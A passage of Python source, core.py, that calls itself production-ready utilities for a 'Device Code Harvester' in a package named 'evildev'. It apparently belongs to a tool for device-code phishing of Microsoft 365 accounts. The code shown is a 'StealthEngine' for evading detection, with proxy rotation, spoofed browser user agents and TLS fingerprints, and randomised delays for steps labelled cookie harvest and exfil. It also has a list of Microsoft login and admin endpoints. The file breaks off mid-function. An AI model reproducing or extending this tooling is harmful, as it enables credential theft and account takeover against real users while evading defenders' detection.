#!/usr/bin/env python3
"""
core.py - Production-ready shared utilities for the Device Code Harvester
Provides: CryptoUtils, StealthEngine, JWT helpers, session payload builder
"""

import os
import sys
import json
import time
import base64
import binascii
import hashlib
import random
import functools
import socket
import ssl
import threading
import traceback
from collections import deque
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Callable, Union
from urllib.parse import quote

import requests
from requests.adapters import HTTPAdapter

try:
    # urllib3's Retry is used for robust retries on transient errors
    from urllib3.util import Retry
except ImportError:
    Retry = None

try:
    from urllib3 import PoolManager
except ImportError:
    PoolManager = None

# Optional TLS libraries with graceful fallback
try:
    import tls_client
    HAS_TLS_CLIENT = True
except ImportError:
    tls_client = None
    HAS_TLS_CLIENT = False

try:
    from curl_cffi import requests as curl_requests
    HAS_CURL_CFFI = True
except ImportError:
    curl_requests = None
    HAS_CURL_CFFI = False

# Import enhanced logger and proxy helpers with package-aware fallbacks
try:
    from evildev.logger import get_logger
except ImportError:
    try:
        from logger import get_logger
    except ImportError:
        def get_logger(name=None):
            class DummyLogger:
                def __getattr__(self, item):
                    def noop(*args, **kwargs):
                        return None
                    return noop
            return DummyLogger()

try:
    from evildev.proxy_manager import (
        get_next_proxy,
        get_all_proxies,
        load_proxies_from_env_or_file,
        get_proxy_count
    )
except ImportError:
    try:
        from proxy_manager import (
            get_next_proxy,
            get_all_proxies,
            load_proxies_from_env_or_file,
            get_proxy_count
        )
    except ImportError:
        def get_next_proxy(*args, **kwargs):
            return None
        def get_all_proxies(*args, **kwargs):
            return []
        def load_proxies_from_env_or_file(*args, **kwargs):
            return []
        def get_proxy_count(*args, **kwargs):
            return 0

# Initialize logger for this module
logger = get_logger('core')
_EMITTED_ONCE_LOGS = set()


# ========================================================================
# RETRY POLICY (Thread-Safe)
# ========================================================================
class RetryPolicy:
    """
    Thread-safe retry policy for explicit control over retry behavior.
    
    Thread Safety:
    - Each call gets its own retry state (no shared state between threads)
    - time.sleep() is used between retries (acceptable for synchronous I/O)
    - No global state is maintained across different RetryPolicy instances
    """
    
    def __init__(
        self,
        max_retries: int = 2,
        base_delay: float = 1.0,
        backoff_factor: float = 2.0,
        jitter_range: Tuple[float, float] = (0, 1.0)
    ):
        """
        Initialize retry policy.
        
        Args:
            max_retries: Number of retry attempts (total attempts = 1 + max_retries)
            base_delay: Initial delay in seconds between retries
            backoff_factor: Exponential backoff multiplier
            jitter_range: Tuple of (min, max) for random jitter added to delay
        """
        self.max_retries = max_retries
        self.base_delay = base_delay
        self.backoff_factor = backoff_factor
        self.jitter_range = jitter_range
        self.attempt_count = 0
    
    def calculate_delay(self, attempt: int) -> float:
        """Calculate delay for a given attempt (0-indexed)."""
        base = self.base_delay * (self.backoff_factor ** attempt)
        jitter = random.uniform(*self.jitter_range)
        return base + jitter
    
    def execute(
        self,
        func: Callable,
        *args,
        exception_type: Any = requests.RequestException,
        **kwargs
    ) -> Any:
        """
        Execute a function with retry logic. Thread-safe per-call.
        
        Args:
            func: Callable to execute
            args: Positional arguments to func
            exception_type: Exception type(s) to catch and retry on
            kwargs: Keyword arguments to func
            
        Returns:
            Return value of func
            
        Raises:
            The last exception encountered if all retries are exhausted
        """
        last_error = None
        
        for attempt in range(self.max_retries + 1):
            try:
                self.attempt_count = attempt + 1
                result = func(*args, **kwargs)
                if attempt > 0:
                    logger.debug(f"Retry succeeded on attempt {attempt + 1}/{self.max_retries + 1}")
                return result
            except exception_type as e:
                if type(e).__name__ == 'FatalRefreshError':
                    logger.error(f"Fatal refresh error, aborting retries: {e}")
                    raise
                last_error = e
                if attempt < self.max_retries:
                    delay = self.calculate_delay(attempt)
                    logger.warning(f"Attempt {attempt + 1} failed: {e}; retrying in {delay:.2f}s")
                    time.sleep(delay)
                else:
                    logger.error(f"All {self.max_retries + 1} retry attempts exhausted: {e}")
        
        if last_error:
            raise last_error
        raise RuntimeError("Retry loop exited without returning or raising")


# ========================================================================
# CRYPTOGRAPHY
# ========================================================================
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    CRYPTO_AVAILABLE = True
except ImportError:
    AESGCM = None
    CRYPTO_AVAILABLE = False
    logger.warning("cryptography not installed, AES encryption will be unavailable")


class CryptoUtils:
    """Cryptographic utilities for AES-256-GCM encryption/decryption."""
    
    @staticmethod
    def generate_key() -> bytes:
        """Generate a secure random 32-byte key for AES-256-GCM."""
        key = os.urandom(32)
        logger.debug(f"Generated new encryption key: {key.hex()[:16]}...")
        return key

    @staticmethod
    def aes_gcm_encrypt(key: bytes, plaintext: bytes, aad: bytes = b"") -> Tuple[bytes, bytes]:
        """Encrypt plaintext using AES-256-GCM. Returns (nonce, ciphertext)."""
        if not CRYPTO_AVAILABLE or AESGCM is None:
            raise RuntimeError("cryptography library not installed")
        
        aesgcm = AESGCM(key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext, aad)
        logger.debug(f"Encrypted {len(plaintext)} bytes with nonce {nonce.hex()[:8]}...")
        return nonce, ciphertext

    @staticmethod
    def aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext: bytes, aad: bytes = b"") -> bytes:
        """Decrypt ciphertext using AES-256-GCM."""
        if not CRYPTO_AVAILABLE or AESGCM is None:
            raise RuntimeError("cryptography library not installed")
        
        aesgcm = AESGCM(key)
        plaintext = aesgcm.decrypt(nonce, ciphertext, aad)
        logger.debug(f"Decrypted {len(ciphertext)} bytes successfully")
        return plaintext

    @staticmethod
    def b64_encode(data: bytes) -> str:
        """Base64 encode bytes to string."""
        return base64.b64encode(data).decode('utf-8')

    @staticmethod
    def b64_decode(data: str) -> bytes:
        """Base64 decode string to bytes."""
        return base64.b64decode(data)
    
    @staticmethod
    def b64_url_encode(data: bytes) -> str:
        """Base64 URL-safe encode bytes to string."""
        return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')
    
    @staticmethod
    def b64_url_decode(data: str) -> bytes:
        """Base64 URL-safe decode string to bytes."""
        # Add padding if necessary (safe calculation)
        padding = (-len(data)) % 4
        if padding:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)


# ========================================================================
# DNS CACHING
# ========================================================================
class DNSCache:
    """Simple DNS cache with TTL for reducing DNS lookups."""
    
    def __init__(self, ttl: int = 300):
        """
        Initialize DNS cache.
        
        Args:
            ttl: Time-to-live for cache entries in seconds (default: 5 minutes)
        """
        self.cache: Dict[str, Dict[str, Any]] = {}
        self.ttl = ttl
        self.lock = threading.Lock()
    
    def get(self, hostname: str) -> Optional[str]:
        """Get cached IP for hostname or perform DNS lookup."""
        with self.lock:
            if hostname in self.cache:
                entry = self.cache[hostname]
                if time.time() - entry['timestamp'] < self.ttl:
                    logger.debug(f"DNS cache hit for {hostname}: {entry['ip']}")
                    return entry['ip']
                else:
                    del self.cache[hostname]
            
            try:
                ip = socket.gethostbyname(hostname)
                self.cache[hostname] = {'ip': ip, 'timestamp': time.time()}
                logger.debug(f"DNS lookup cached for {hostname}: {ip}")
                return ip
            except socket.gaierror as e:
                logger.debug(f"DNS lookup failed for {hostname}: {e}")
                return None
    
    def clear(self) -> None:
        """Clear all cached entries."""
        with self.lock:
            self.cache.clear()
            logger.debug("DNS cache cleared")


# ========================================================================
# API RESPONSE WRAPPER
# ========================================================================
class APIResponse:
    """Wrapper for API responses with validation and error handling."""
    
    def __init__(self, response: requests.Response):
        """
        Initialize response wrapper.
        
        Args:
            response: requests.Response object
        """
        self.response = response
        self.raw = response
        self.status_code = response.status_code
        self.success = 200 <= response.status_code < 300
        self.text = response.text
        self.headers = response.headers
    
    def json(self) -> Optional[Dict]:
        """Safely parse JSON with validation."""
        try:
            return self.response.json()
        except json.JSONDecodeError:
            logger.debug(f"Failed to parse JSON response: {self.text[:200]}")
            return None
    
    def raise_for_status(self) -> 'APIResponse':
        """Raise exception with context for error responses."""
        if not self.success:
            error_msg = f"Request failed: {self.status_code}"
            try:
                data = self.json()
                if data and 'error' in data:
                    error_msg += f" - {data['error']}"
            except Exception:
                pass
            raise requests.HTTPError(error_msg)
        return self
    
    def get_data(self, key: Optional[str] = None, default: Any = None) -> Any:
        """Get data from JSON response with optional key access."""
        data = self.json()
        if data is None:
            return default
        if key is None:
            return data
        return data.get(key, default)


# ========================================================================
# USER-AGENT MANAGER
# ========================================================================
class UserAgentManager:
    """Enhanced User-Agent management with device fingerprints."""
    
    # Class-level constants: shared across all instances (no duplication)
    USER_AGENTS: Dict[str, List[str]] = {
        'chrome_win': [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36",
        ],
        'chrome_mac': [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36",
        ],
        'firefox_win': [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{version}.0) Gecko/20100101 Firefox/{version}.0",
        ],
        'firefox_mac': [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:{version}.0) Gecko/20100101 Firefox/{version}.0",
        ],
        'safari': [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
        ],
        'edge_win': [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 Edg/{version}.0.0.0",
        ],
        'mobile_chrome': [
            "Mozilla/5.0 (Linux; Android 13; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.{patch}.0 Mobile Safari/537.36",
        ],
        'mobile_safari': [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        ],
    }
    
    VERSIONS: Dict[str, List[str]] = {
        'chrome': ['127', '126', '125', '124', '123'],
        'firefox': ['128', '127', '126', '125'],
        'edge': ['127', '126', '125'],
    }
    
    def __init__(self):
        """Initialize User-Agent manager with instance-level rotation state."""
        self._current_index = 0
        self._lock = threading.Lock()
    
    def get_random_ua(self) -> str:
        """Get a random User-Agent with realistic version."""
        ua_type = random.choice(list(self.USER_AGENTS.keys()))
        ua_templates = self.USER_AGENTS[ua_type]
        ua_template = random.choice(ua_templates)
        
        # Determine version string based on UA type
        if 'chrome' in ua_type:
            version = random.choice(self.VERSIONS['chrome'])
            patch = str(random.randint(1, 100))
            return ua_template.replace('{version}', version).replace('{patch}', patch)
        elif 'firefox' in ua_type:
            version = random.choice(self.VERSIONS['firefox'])
            return ua_template.replace('{version}', version)
        elif 'edge' in ua_type:
            version = random.choice(self.VERSIONS['edge'])
            return ua_template.replace('{version}', version)
        else:
            return ua_template
    
    def get_sequential_ua(self) -> str:
        """Get User-Agent in sequence for consistency during session."""
        with self._lock:
            ua_types = list(self.USER_AGENTS.keys())
            ua_type = ua_types[self._current_index % len(ua_types)]
            self._current_index += 1
        return self.get_random_ua()


# ========================================================================
# METRICS COLLECTOR
# ========================================================================
class MetricsCollector:
    """Collect request metrics for monitoring and performance analysis."""
    
    def __init__(self, max_samples: int = 1000):
        """
        Initialize metrics collector.
        
        Args:
            max_samples: Maximum number of request times to keep in memory
        """
        self.metrics: Dict[str, Any] = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'proxy_success': 0,
            'proxy_fail': 0,
            'bypass_count': 0,
            'request_times': deque(maxlen=max_samples),
        }
        self.lock = threading.Lock()
    
    def record_request(
        self,
        success: bool,
        duration: float,
        bypassed: bool = False,
        used_proxy: bool = False
    ) -> None:
        """Record a request metric."""
        with self.lock:
            self.metrics['total_requests'] += 1
            self.metrics['request_times'].append(duration)
            
            if success:
                self.metrics['successful_requests'] += 1
                if used_proxy:
                    self.metrics['proxy_success'] += 1
            else:
                self.metrics['failed_requests'] += 1
                if used_proxy:
                    self.metrics['proxy_fail'] += 1
            
            if bypassed:
                self.metrics['bypass_count'] += 1
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current metrics statistics."""
        with self.lock:
            times = list(self.metrics['request_times'])
            avg_time = sum(times) / len(times) if times else 0
            success_rate = self.metrics['successful_requests'] / max(1, self.metrics['total_requests'])
            
            return {
                'total_requests': self.metrics['total_requests'],
                'successful_requests': self.metrics['successful_requests'],
                'failed_requests': self.metrics['failed_requests'],
                'proxy_success': self.metrics['proxy_success'],
                'proxy_fail': self.metrics['proxy_fail'],
                'bypass_count': self.metrics['bypass_count'],
                'avg_request_time_ms': avg_time * 1000,
                'success_rate': success_rate,
                'sample_count': len(times),
            }
    
    def reset(self) -> None:
        """Reset all metrics."""
        with self.lock:
            self.metrics['total_requests'] = 0
            self.metrics['successful_requests'] = 0
            self.metrics['failed_requests'] = 0
            self.metrics['proxy_success'] = 0
            self.metrics['proxy_fail'] = 0
            self.metrics['bypass_count'] = 0
            self.metrics['request_times'].clear()


# ========================================================================
# STEALTH ENGINE
# ========================================================================
class StealthEngine:
    """
    Stealth engine for evading detection:
    - Random User-Agent rotation
    - Proxy rotation (from list)
    - Jitter (random delays) per operation type
    - Request fingerprint randomization
    - Smart proxy bypass for Microsoft endpoints (fallback on 403)
    """
    
    # Microsoft endpoints that should bypass proxy if 403 is encountered
    MICROSOFT_ENDPOINTS: List[str] = [
        'login.microsoftonline.com',
        'login.microsoft.com',
        'graph.microsoft.com',
        'microsoft.com',
        'office.com',
        'azure.com',
        'sharepoint.com',
        'teams.microsoft.com',
        'portal.azure.com',
        'outlook.office365.com',
        'myapps.microsoft.com',
        'account.activedirectory.windowsazure.com',
        'security.microsoft.com',
        'admin.microsoft.com',
        'compliance.microsoft.com',
        'office365.com',
        'windows.net',
        'msftauthimages.net',
    ]
    
    USER_AGENTS: List[str] = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    ]
    
    # Additional headers to randomize for better stealth
    ACCEPT_LANGUAGES: List[str] = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en-US,en;q=0.9,fr;q=0.8', 'en;q=0.9,es;q=0.8']
    ACCEPT_ENCODINGS: List[str] = ['gzip, deflate, br', 'gzip, deflate', 'br, gzip, deflate']
    SEC_CH_UA_PLATFORMS: List[str] = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
    
    def __init__(
        self,
        proxy_list: Optional[List[str]] = None,
        min_jitter: float = 1.0,
        max_jitter: float = 3.5,
        use_manager_proxy: bool = True
    ):
        """
        Initialize stealth engine with advanced features.
        
        Args:
            proxy_list: List of proxy URLs (e.g., ['http://user:pass@proxy1:8080', ...])
            min_jitter: Minimum jitter delay in seconds
            max_jitter: Maximum jitter delay in seconds
            use_manager_proxy: Whether to use the centralized proxy manager
        """
        self.use_manager_proxy = bool(use_manager_proxy)

        if proxy_list is None:
            # Ensure proxy_manager has loaded proxies from env or proxy.txt
            try:
                _proxy_file = Path(__file__).resolve().parents[1] / 'proxy.txt'
                load_proxies_from_env_or_file('PROXY_LIST', str(_proxy_file))
            except Exception:
                pass
            proxy_list = get_all_proxies() or []

        self.proxy_list = proxy_list
        self.proxy_index = 0
        self.min_jitter = min_jitter
        self.max_jitter = max_jitter
        self._session_count = 0
        self._last_selected_proxy = None
        self._poll_coffee_modulus = 0
        self._use_tls_impersonation = HAS_CURL_CFFI and os.environ.get('TLS_IMPERSONATE', '').lower() == 'true'
        
        # Cache for endpoints that need proxy bypass
        self._bypass_cache: set = set()
        
        # Connection pooling
        self._session_pool: Dict[str, requests.Session] = {}
        self._pool_lock = threading.Lock()
        self._pool_size = int(os.environ.get('CONNECTION_POOL_SIZE', '10'))
        
        # urllib3 PoolManager for lower-level pooled connections
        try:
            self._http_manager = PoolManager(num_pools=10, maxsize=20) if PoolManager else None
        except Exception:
            self._http_manager = None
        
        # DNS caching
        self.dns_cache = DNSCache(ttl=int(os.environ.get('DNS_CACHE_TTL', '300')))
        
        # Timeout configuration
        self.connect_timeout = float(os.environ.get('CONNECT_TIMEOUT', '10'))
        self.read_timeout = float(os.environ.get('READ_TIMEOUT', '30'))
        
        # User-Agent manager
        self.ua_manager = UserAgentManager()
        
        # Proxy health tracking
        self._healthy_proxies: set = set()
        self._failed_proxies: set = set()
        
        # Metrics collection
        self.metrics = MetricsCollector()
        
        if self.proxy_list:
            key = f"proxies_loaded::{len(self.proxy_list)}"
            if key not in _EMITTED_ONCE_LOGS:
                _EMITTED_ONCE_LOGS.add(key)
                logger.proxy(f"Loaded {len(self.proxy_list)} proxies for rotation")
        else:
            key = "proxies_none"
            if key not in _EMITTED_ONCE_LOGS:
                _EMITTED_ONCE_LOGS.add(key)
                logger.proxy("No proxies configured - using direct connections")

    def random_ua(self) -> str:
        """Return a random User-Agent string from enhanced manager."""
        return self.ua_manager.get_random_ua()
    
    def random_headers(self) -> Dict[str, str]:
        """Generate random HTTP headers for better stealth."""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(self.ACCEPT_LANGUAGES),
            'Accept-Encoding': random.choice(self.ACCEPT_ENCODINGS),
            'Connection': random.choice(['keep-alive', 'close']),
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
        }

    def jitter(self, step_type: str = 'default') -> None:
        """
        Apply a random sleep delay based on operation type.
        """
        base_map = {
            'device_code': 0.5,
            'poll': 1.0,
            'cookie_harvest': 2.0,
            'exfil': 3.0,
        }
        base = base_map.get(step_type, 1.0)
        variation = random.uniform(0.5, 1.5)
        delay = base * variation
        if random.random() < 0.05:
            delay += random.uniform(5, 20)
            logger.debug(f"Extended jitter applied: +{delay:.2f}s")
        if delay > 0.1:
            time.sleep(delay)

    def _get_proxy(self) -> Optional[Dict[str, str]]:
        """Get the next proxy in rotation."""
        try:
            proxy_url = None

            if self.use_manager_proxy:
                proxy_url = get_next_proxy()

            if not proxy_url and self.proxy_list:
                self.proxy_index = (self.proxy_index + 1) % len(self.proxy_list)
                proxy_url = self.proxy_list[self.proxy_index]

            if not proxy_url:
                return None

            return {"http": proxy_url, "https": proxy_url}
        except Exception as exc:
            logger.warning(f"Proxy selection failed: {exc}")
            if self.proxy_list:
                self.proxy_index = (self.proxy_index + 1) % len(self.proxy_list)
                proxy_url = self.proxy_list[self.proxy_index]
                return {"http": proxy_url, "https": proxy_url}
            return None

    def _should_bypass_proxy(self, url: str) -> bool:
        """
        Return True for Microsoft endpoints that should always use the server's
        real IP instead of a proxy.

        This is the DEFAULT behavior. Set PROXY_BYPASS_MICROSOFT=false in .env
        to force Microsoft traffic through the proxy pool instead.
        """
        if not url:
            return False

        enabled = os.environ.get('PROXY_BYPASS_MICROSOFT', 'true').lower() in ('true', '1', 'yes')
        if not enabled:
            return False

        url_lower = url.lower()
        return any(endpoint in url_lower for endpoint in self.MICROSOFT_ENDPOINTS)

    def _mark_proxy_bad(self, proxy_url: Optional[str]) -> None:
        """Mark a proxy as unhealthy so later requests skip it."""
        if not proxy_url:
            return
        self._failed_proxies.add(proxy_url)
        self._healthy_proxies.discard(proxy_url)

    def _make_request_with_fallback(
        self,
        original_request: Callable,
        session: requests.Session,
        method: str,
        url: str,
        *args,
        **kwargs
    ) -> requests.Response:
        """
        Make a request. Microsoft endpoints always go direct (server IP);
        everything else goes through the configured proxy with 403 fallback.
        """
        if self._should_bypass_proxy(url):
            original_proxies = session.proxies.copy()
            session.proxies = {}
            try:
                logger.debug(f"[BYPASS] Microsoft endpoint → direct: {url}")
                return original_request(method, url, *args, **kwargs)
            finally:
                session.proxies = original_proxies

        proxy_url = session.proxies.get('http') or session.proxies.get('https') if session.proxies else None

        try:
            response = original_request(method, url, *args, **kwargs)
            if response.status_code == 403 and proxy_url:
                self._mark_proxy_bad(proxy_url)
                logger.warning(f"403 with proxy, retrying without proxy: {url}")
                original_proxies = session.proxies.copy()
                session.proxies = {}
                try:
                    return original_request(method, url, *args, **kwargs)
                finally:
                    session.proxies = original_proxies
            return response

        except (requests.exceptions.ProxyError,
                requests.exceptions.ConnectionError,
                requests.exceptions.Timeout):
            self._mark_proxy_bad(proxy_url)
            raise

    def update_proxy_list(self, proxy_list: Optional[List[str]] = None) -> None:
        """Update the proxy list at runtime."""
        if proxy_list is None:
            try:
                _proxy_file = Path(__file__).resolve().parents[1] / 'proxy.txt'
                load_proxies_from_env_or_file('PROXY_LIST', str(_proxy_file))
                proxy_list = get_all_proxies()
            except Exception:
                proxy_list_env = os.environ.get('PROXY_LIST')
                if proxy_list_env:
                    proxy_list = [p.strip() for p in proxy_list_env.split(',') if p.strip()]
                else:
                    proxy_list = []

        self.proxy_list = proxy_list
        self.proxy_index = 0
        self._bypass_cache.clear()
        
        if self.proxy_list:
            logger.proxy(f"Updated proxy list at runtime: {len(self.proxy_list)} proxies")
        else:
            logger.proxy("Cleared proxy list at runtime - using direct connections")

    # ====== CONNECTION POOLING ======
    def _get_pooled_session(self, proxy_url: Optional[str] = None) -> requests.Session:
        """Get a pooled session with connection reuse and retry configuration."""
        pool_key = proxy_url or 'direct'
        
        with self._pool_lock:
            if pool_key not in self._session_pool:
                sess = requests.Session()
                sess.trust_env = False
                
                # Configure connection pooling with robust retries
                if Retry is not None:
                    retries = Retry(
                        total=3,
                        backoff_factor=0.5,
                        status_forcelist=[429, 500, 502, 503, 504],
                        allowed_methods=frozenset(['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS'])
                    )
                else:
                    retries = None
                
                adapter = HTTPAdapter(
                    pool_connections=5,
                    pool_maxsize=self._pool_size,
                    max_retries=retries
                )
                sess.mount('http://', adapter)
                sess.mount('https://', adapter)
                
                if proxy_url:
                    sess.proxies = {'http': proxy_url, 'https': proxy_url}
                
                self._session_pool[pool_key] = sess
                logger.debug(f"Created pooled session for {pool_key}")
            
            return self._session_pool[pool_key]
    
    def clear_session_pool(self) -> None:
        """Clear all pooled sessions."""
        with self._pool_lock:
            for key, sess in self._session_pool.items():
                try:
                    sess.close()
                except Exception:
                    pass
            self._session_pool.clear()
            logger.debug("Session pool cleared")
    
    # ====== PROXY HEALTH CHECKS ======
    def check_proxy_health(self, proxy_url: str) -> bool:
        """Check if a proxy is working by making a test request."""
        try:
            # Prefer urllib3 PoolManager for lightweight pooled checks if available
            if self._http_manager:
                try:
                    resp = self._http_manager.request('GET', 'https://httpbin.org/ip', timeout=10.0, retries=1)
                    if getattr(resp, 'status', None) == 200:
                        self._healthy_proxies.add(proxy_url)
                        self._failed_proxies.discard(proxy_url)
                        logger.debug(f"Proxy health check PASSED (poolmanager): {proxy_url}")
                        return True
                except Exception:
                    pass

            sess = requests.Session()
            sess.proxies = {'http': proxy_url, 'https': proxy_url}
            sess.timeout = (self.connect_timeout, self.read_timeout)

            response = sess.get('https://httpbin.org/ip', timeout=(5, 10))
            if response.status_code == 200:
                self._healthy_proxies.add(proxy_url)
                self._failed_proxies.discard(proxy_url)
                logger.debug(f"Proxy health check PASSED: {proxy_url}")
                return True
        except Exception as e:
            logger.debug(f"Proxy health check FAILED for {proxy_url}: {e}")
        
        self._failed_proxies.add(proxy_url)
        self._healthy_proxies.discard(proxy_url)
        return False
    
    def get_healthy_proxy(self) -> Optional[Dict[str, str]]:
        """Get a healthy proxy, skipping failed ones."""
        max_attempts = min(10, len(self.proxy_list))
        for _ in range(max_attempts):
            proxy = self._get_proxy()
            if proxy:
                proxy_url = proxy.get('http')
                if proxy_url not in self._failed_proxies:
                    return proxy
                else:
                    logger.debug(f"Skipping failed proxy: {proxy_url}")
        
        logger.warning("No healthy proxies available")
        return None

    def build_session(self) -> requests.Session:
        """
        Build a requests Session with random User-Agent, custom headers, and optional proxy.
        Features smart proxy bypass for Microsoft endpoints with 403 fallback.
        Uses connection pooling for improved performance.
        """
        # Apply jitter before creating a session to avoid timing fingerprints
        try:
            self.jitter('session')
        except Exception:
            pass

        self._session_count += 1

        sess = None
        if self._use_tls_impersonation and HAS_CURL_CFFI:
            try:
                import curl_cffi
                sess = curl_cffi.requests.Session()
                sess.impersonate = random.choice(["chrome123", "chrome124", "chrome125", "safari17_5"])
                headers = self.random_headers()
                headers['User-Agent'] = self.random_ua()
                sess.headers.update(headers)
                sess.verify = os.environ.get('DISABLE_SSL_VERIFY', '').lower() != 'true'
                logger.info(f"Using curl_cffi Session with impersonation={sess.impersonate}")
            except Exception as exc:
                logger.warning(f"curl_cffi session failed ({exc}); falling back to requests.Session")
                sess = requests.Session()

        if sess is None:
            use_tls = os.environ.get('USE_TLS_CLIENT', '').lower() == 'true' and HAS_TLS_CLIENT
            if use_tls:
                client_id = os.environ.get('TLS_CLIENT_ID', 'chrome_125')
                try:
                    sess = tls_client.Session(client_identifier=client_id)
                    sess.headers = {}
                    sess.verify = os.environ.get('DISABLE_SSL_VERIFY', '').lower() != 'true'
                    logger.info(f"Using tls_client Session with client_identifier={client_id}")
                except Exception:
                    logger.warning("tls_client.Session construction failed; falling back to requests.Session")
                    sess = requests.Session()
            else:
                sess = requests.Session()

        sess.trust_env = False
        
        # Set random User-Agent and headers
        headers = self.random_headers()
        headers['User-Agent'] = self.random_ua()
        sess.headers.update(headers)
        
        # Configure proxy if available
        proxy = self._get_proxy()
        self._last_selected_proxy = None
        timeout_tuple = (self.connect_timeout, max(self.read_timeout, 15.0))

        original_request = sess.request
        wrapped_request = functools.partial(original_request, timeout=timeout_tuple)

        if proxy:
            proxy_url = proxy.get('http')
            self._last_selected_proxy = proxy_url
            sess.proxies.update(proxy)

            def patched_request(method, url, *args, **kwargs):
                return self._make_request_with_fallback(wrapped_request, sess, method, url, *args, **kwargs)

            sess.request = patched_request
            logger.proxy(f"Session {self._session_count} using proxy: {proxy_url} (smart fallback enabled)")
        else:
            self._last_selected_proxy = None
            sess.request = functools.partial(self._make_request_with_fallback, wrapped_request, sess)
            logger.proxy(f"Session {self._session_count} using direct connection (smart fallback enabled)")

        # Prevent environment proxy values from interfering with configured proxies
        sess.trust_env = False

        # Add a Retry adapter to handle transient network errors gracefully
        try:
            if Retry is not None:
                retries = Retry(
                    total=3,
                    backoff_factor=0.5,
                    status_forcelist=(429, 500, 502, 503, 504),
                    allowed_methods=frozenset(['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS'])
                )
                adapter = HTTPAdapter(max_retries=retries)
                sess.mount('https://', adapter)
                sess.mount('http://', adapter)
        except Exception:
            logger.debug('Retry adapter not available or failed to mount')

        # Partial mitigation: force a more Chrome-like TLS client hello when requests is used
        if not self._use_tls_impersonation and not (hasattr(sess, 'impersonate') and sess.impersonate):
            try:
                class StealthHTTPAdapter(HTTPAdapter):
                    """HTTPAdapter that enforces a Chrome-like TLS client hello."""
                    def init_poolmanager(self, *args, **kwargs):
                        context = ssl.create_default_context()
                        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:ECDHE+AES:!aNULL:!eNULL:!MD5')
                        context.minimum_version = ssl.TLSVersion.TLSv1_2
                        context.maximum_version = ssl.TLSVersion.TLSv1_3
                        kwargs['ssl_context'] = context
                        return super().init_poolmanager(*args, **kwargs)

                sess.mount('https://', StealthHTTPAdapter())
                sess.mount('http://', StealthHTTPAdapter())
                logger.debug('Mounted StealthHTTPAdapter for Chrome-like TLS handshake')
            except Exception as exc:
                logger.debug(f'Stealth TLS adapter mount failed: {exc}')

        # Disable SSL verification if needed (for testing only)
